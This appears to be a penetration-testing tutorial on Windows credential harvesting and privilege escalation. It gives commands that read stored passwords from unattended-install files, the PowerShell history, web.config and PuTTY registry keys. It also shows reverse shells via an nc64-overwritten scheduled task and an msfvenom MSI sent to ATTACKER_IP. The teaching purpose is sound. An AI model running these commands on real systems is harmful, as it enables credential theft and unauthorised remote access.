HARVESTING PASSWORDS FROM USUAL SPOTS

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, 
including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.



1. UNATTENDED WINDOWS INSTALLATIONS

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating 
system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as 
they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end 
up being stored in the machine in the following locations:

	C:\Unattend.xml
	C:\Windows\Panther\Unattend.xml
	C:\Windows\Panther\Unattend\Unattend.xml
	C:\Windows\system32\sysprep.inf
	C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

	<Credentials>
	    <Username>Administrator</Username>
	    <Domain>domain.name</Domain>
	    <Password>MyPassword123</Password>
	</Credentials>


2. POWERSHELL HISTORY

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating 
commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can 
later be retrieved by using the following command from a cmd.exe prompt:

	type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

NOTE: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file 
      from Powershell, you'd have to replace %userprofile% with $Env:userprofile

	type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


3. SAVED WINDOWS CREDENTIALS

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below 
will list saved credentials:

	cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred 
option, as seen below.

	runas /savecred /user:admin cmd.exe


4. IIS CONFIGURATION

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a 
file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of 
IIS, we can find 'web.config' in one of the following locations:

	C:\inetpub\wwwroot\web.config
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

	type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString


5. RETRIEVE CREDENTIALS FROM SOFTWARE : PUTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can 
store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, 
it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

	reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

NOTE: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored 
      proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software 
and others, will have methods to recover any passwords the user has saved.

---------------

Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you 
considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. 
However, if none of the previously mentioned methods works, you can always go back to these.


1. SCHEDULED TASKS

You may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the 'schtasks' command without any options. To retrieve detailed information about any 
of the services, you can use a command like the following one:

	schtasks /query /tn vulntask /fo list /v

Gives lots of information about the task, but what matters for us is the -
	"Task to Run" parameter - indicates what gets executed by the scheduled task
	"Run As User" parameter - shows the user that will be used to execute the task

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in 
a simple privilege escalation. To check the file permissions on the executable, we use 'icacls':

	icacls c:\tasks\schtask.bat

	Sample O/P:	c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    			BUILTIN\Administrators:(I)(F)
                    			BUILTIN\Users:(I)(F)

The BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. 

Let's change the bat file to spawn a reverse shell:

	echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat	# nc64.exe is the NetCat executable for Windows

	nc -lvp 4444		# start a listener on the attacker machine on the same port we indicated on our reverse shell

You should receive the reverse shell with taskusr1 privileges after executing the task.

	schtasks /run /tn vulntask



2. ALWAYSINSTALLELEVATED

Windows installer files (aka .msi files) are used to install applications on the system. They usually run with the privilege level of the user 
that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could 
potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.

	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate 
a malicious .msi file using msfvenom, as seen below:

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.86.217 LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have 
created, you can run the installer with the command below and receive the reverse shell:

	C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi















